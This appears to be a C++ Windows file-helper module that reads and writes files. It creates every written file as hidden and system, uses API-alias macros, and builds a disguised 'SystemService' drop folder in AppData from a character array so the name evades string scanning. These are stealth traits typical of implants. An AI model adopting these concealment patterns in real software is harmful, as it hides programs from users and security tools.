#include "FileHelper.h"
#include <DbgHelp.h>
#include <shlobj_core.h>


#define lpFindFirstFileA FindFirstFileA
#define lpFindClose FindClose
#define lpCreateFileA CreateFileA
#define lpGetFileSize GetFileSize
#define lpWriteFile	WriteFile


int GetPathFromFullName(char* strFullName, char* strDst)
{
	int srclen = lstrlenA(strFullName);
	lstrcpyA(strDst, strFullName);
	for (int i = srclen - 1; i >= 0; i--)
	{
		if (strDst[i] == '\\')
		{
			*(strDst + i + 1) = 0;
			return i + 1;
		}
	}

	strDst[0] = 0;
	return FALSE;
}

int FileHelper::CheckFileExist(string filename) {
	HANDLE hFile = CreateFileA((char*)filename.c_str(), GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		int err = GetLastError();
		if (err == 32 || err == 183)
		{
			return TRUE;
		}
		return FALSE;
	}
	else {
		CloseHandle(hFile);
		return TRUE;
	}
}


int FileHelper::CheckPathExist(string path) {
	if (path.back() != '\\')
	{
		path.append("\\");
	}
	path.append("*.*");

	WIN32_FIND_DATAA stfd;
	HANDLE hFind = lpFindFirstFileA((char*)path.c_str(), &stfd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		int err = GetLastError();
		if (err == 32 || err == 183)
		{
			return TRUE;
		}
		return FALSE;
	}
	else {
		lpFindClose(hFind);
		return TRUE;
	}
}


int FileHelper::fileReader(string filename, CHAR** lpbuf, int* lpsize) {
	int result = 0;

	HANDLE hf = lpCreateFileA(filename.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, 
		FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hf == INVALID_HANDLE_VALUE)
	{
		result = GetLastError();
		return FALSE;
	}

	DWORD highsize = 0;
	*lpsize = lpGetFileSize(hf, &highsize);

	if (lpbuf)
	{
		if (*lpbuf == 0)
		{
			*lpbuf = new CHAR[*lpsize + 1024];
			*(*lpbuf) = 0;
		}
	}
	else {
		CloseHandle(hf);
		return FALSE;
	}

	DWORD readsize = 0;
	result = ReadFile(hf, *lpbuf, *lpsize, &readsize, 0);
	if (result > 0)
	{
		*(CHAR*)((char*)*lpbuf + readsize) = 0;
	}
	else {
		result = GetLastError();
	}
	CloseHandle(hf);
	return readsize;
}



int FileHelper::fileWriter(string filename, const CHAR* lpbuf, int lpsize, int cover) {
	int result = 0;
	HANDLE h = INVALID_HANDLE_VALUE;
	if (cover == 0)
	{
		h = lpCreateFileA(filename.c_str(), GENERIC_WRITE, 0, 0, OPEN_ALWAYS,
			FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NORMAL, 0);
		if (h == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}
		DWORD highsize = 0;
		DWORD filesize = lpGetFileSize(h, &highsize);

		result = SetFilePointer(h, filesize, (long*)&highsize, FILE_BEGIN);
	}
	else {
		char path[MAX_PATH];
		int len = GetPathFromFullName((char*)filename.c_str(), path);
		result = MakeSureDirectoryPathExists(path);

		h = lpCreateFileA(filename.c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS,
			FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NORMAL, 0);
		if (h == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}
	}

	DWORD writesize = 0;
	result = lpWriteFile(h, lpbuf, lpsize * sizeof(CHAR), &writesize, 0);
	FlushFileBuffers(h);
	CloseHandle(h);
	return result;
}

int FileHelper::fileWriter(string filename, const char* lpdata, int datasize) {

	return fileWriter(filename, lpdata, datasize, TRUE);

}


int FileHelper::fileReader_c(string filename, char** lpbuf, int* bufsize) {
	int ret = 0;

	FILE* fp = fopen(filename.c_str(), "rb");
	if (fp == 0)
	{
		int error = GetLastError();
		printf("fileReader fopen file:%s error:%u\r\n", filename.c_str(), GetLastError());
		return FALSE;
	}

	ret = fseek(fp, 0, FILE_END);

	int filesize = ftell(fp);

	ret = fseek(fp, 0, FILE_BEGIN);

	*bufsize = filesize;

	*lpbuf = new char[filesize + 0x1000];

	ret = fread(*lpbuf, 1, filesize, fp);
	fclose(fp);
	if (ret <= FALSE)
	{
		delete* lpbuf;
		return FALSE;
	}

	*(*lpbuf + filesize) = 0;
	return filesize;
}






int FileHelper::fileWriter_c(string filename, const char* lpdate, int datesize, int cover) {
	int ret = 0;

	FILE* fp = 0;
	if (cover) {
		fp = fopen(filename.c_str(), "wb");
	}
	else {
		fp = fopen(filename.c_str(), "ab+");
	}

	if (fp == 0)
	{
		printf("fileWriter fopen file:%s error\r\n", filename.c_str());
		return FALSE;
	}

	ret = fwrite(lpdate, 1, datesize, fp);
	fclose(fp);
	if (ret == FALSE)
	{
		return FALSE;
	}

	return datesize;
}



string FileHelper::getReleasePath(const char * path) {
	int ret = 0;

	string folder = "";
	if (isalpha(path[0]) && path[1] == ':' && path[2] == '\\')
	{
		folder = path;
		if (folder.back() != '\\')
		{
			folder.append("\\");
		}
	}
	else {
		char tmppath[MAX_PATH];
		char* mypath = getenv(path);
		if (mypath == 0)
		{
			ret = SHGetSpecialFolderPathA(0, tmppath, CSIDL_LOCAL_APPDATA, false);
			if (ret)
			{
				mypath = tmppath;
			}
			else {
				ret = SHGetSpecialFolderPathA(0, tmppath, CSIDL_MYDOCUMENTS, false);
				mypath = tmppath;
			}
		}
		char service_path[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e',0 };
		//char service_path[] = { 's','e','r','v','i','c','e','s',0 };
		folder = string(mypath) + "\\" + service_path + "\\";
	}

	ret = MakeSureDirectoryPathExists((char*)folder.c_str());
	return folder;
}
